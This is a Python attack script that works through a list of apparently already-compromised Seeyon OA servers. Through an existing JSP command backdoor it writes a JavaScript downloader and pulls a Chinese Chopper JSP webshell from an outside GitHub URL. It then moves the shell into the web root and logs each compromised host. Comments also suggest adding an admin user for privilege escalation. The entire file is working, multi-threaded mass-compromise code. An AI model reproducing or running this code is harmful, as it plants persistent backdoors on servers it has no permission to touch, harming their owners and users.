#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
# __author__:leezp
# __date__:2019-07-02
# Local:  Win7 (python3)
# ***Configure the agent before running***

import requests
import threading
import queue
import urllib
from urllib import request
from urllib import parse

q = queue.Queue()

file = open('success.txt')
for x in file.readlines():
    # 根据具体情况填写
    q.put(x.split('/seeyon')[0])

headers = {
    'Connection': 'Close',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}

# 这是代理IP
proxies = [{'http': '127.0.0.1:1081', 'https': 'socks5h://127.0.0.1:1081'}]  # 使用时需要ss填写正确，并且关闭代理软件
# 创建ProxyHandler
httpproxy_handler = urllib.request.ProxyHandler(proxies[0])
nullproxy_handler = urllib.request.ProxyHandler({})
# 定义一个代理开关
proxySwitch = True
# 根据代理开关是否打开，使用不同的代理模式
if proxySwitch:
    # 创建Opener
    opener = urllib.request.build_opener(httpproxy_handler)
else:
    opener = urllib.request.build_opener(nullproxy_handler)


# 成功的命令执行 写c刀一句话
def CKnife():
    while not q.empty():
        url = q.get()
        #  如果网站404 写不了此js，为安全性问题
        js_payload = 'cmd /c echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile("ping12345.jsp"); >> ping.js'
        requests.packages.urllib3.disable_warnings()
        # 一定要url编码，否则可能把网站搞成500 ，无法访问
        '''
        #写js时可能出现的: Cannot run program "cmd": CreateProcess error=5, 拒绝访问。
        whoami  获取当前用户名
        net user admin XX add  提权
        quote 编码
        '''
        # 第一步 #生成下载文件的js文件
        js_payload = urllib.parse.quote(js_payload)
        request_r = urllib.request.Request(
            url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + js_payload,
            headers=headers)
        try:
            response_r = opener.open(request_r)
        except:
            # 这里except可能原因是jsp页面被删，更多可能是网络不好
            print(url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + ' 404')
            continue
        '''
        # urllib.error.HTTPError: HTTP Error 400: Invalid header received from client 
        # 这个错误将url编码  urllib.parse.quote()
        '''
        request_r2 = urllib.request.Request(
            url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd+/c+dir',
            headers=headers)
        response_r2 = opener.open(request_r2)
        # 测试环境 ping.js 上传到了 JspStudy\tomcat\bin 目录下  多次上传会追加写入，此时ping.js将失去下载功能
        if 'ping.js' in response_r2.read().decode("utf-8"):
            # 第二步 使用js远程下载shell代码
            # 有时候响应500是代理问题
            # payload2 = "cmd /c cscript /nologo ping.js https://pastebin.com/raw/pnNXSi0q"  # 不加https://可能无法写入
            payload2 = "cmd /c cscript /nologo ping.js https://raw.githubusercontent.com/tanjiti/webshellSample/master/jsp/xiaoma/菜刀jsp修改.jsp"  # Pwd = yunyan  caidao
            payload2 = urllib.parse.quote(payload2)
            request_r3 = urllib.request.Request(
                url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + payload2,
                headers=headers)
            response_r3 = opener.open(request_r3)
            request_r4 = urllib.request.Request(
                url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd+/c+dir',
                headers=headers)
            response_r4 = opener.open(request_r4)
            # 判断下载的jsp是否存在
            if 'ping12345.jsp' in response_r4.read().decode("utf-8"):
                # 不同服务器路径可能不同
                # 若此文件名已存在，不会写入该文件
                payload3 = "cmd /c move ping12345.jsp ../webapps/seeyon/"  # 服务器路径
                payload3 = urllib.parse.quote(payload3)
                # payload4="cmd /c move ping12345.jsp ../../WWW" # jspstudy测试路径
                # 第三步 #移动到根目录下
                request_r5 = urllib.request.Request(
                    url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + payload3,
                    headers=headers)
                response_r5 = opener.open(request_r5)
                print('!=========Cknife Webshell :' + url + '/seeyon/ping12345.jsp' + ' ===============!!!\n')
                with open('webshell.txt', 'a') as f:
                    f.write(url + '/seeyon/ping12345.jsp' + '\n')
            else:
                # 这里是存在ping.js却没有下载的，可能是重复写入了ping.js导致了js代码失效，需要将之前的js删除并重新上传ping.js
                '''request_r6 = urllib.request.Request(
                    url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd+/c+del+ping.js',
                    headers=headers)  # 第一步 #生成下载文件的js文件
                response_r6 = opener.open(request_r6)
                # 将需要重新跑的写入文件
                with open('rshell.txt', 'a') as f:
                    f.write(url + '/seeyon/ping123456.jsp' + '\n')
                    '''
                print('webshell write fail，需要单独再跑一次 rshell.txt:' + url + '/seeyon/ping123456.jsp' + '\n')
        else:
            print('js_payload write fail:' + url + '\n')


th = []
th_num = 4
for x in range(th_num):
    t = threading.Thread(target=CKnife)
    th.append(t)
for x in range(th_num):
    th[x].start()
for x in range(th_num):
    th[x].join()
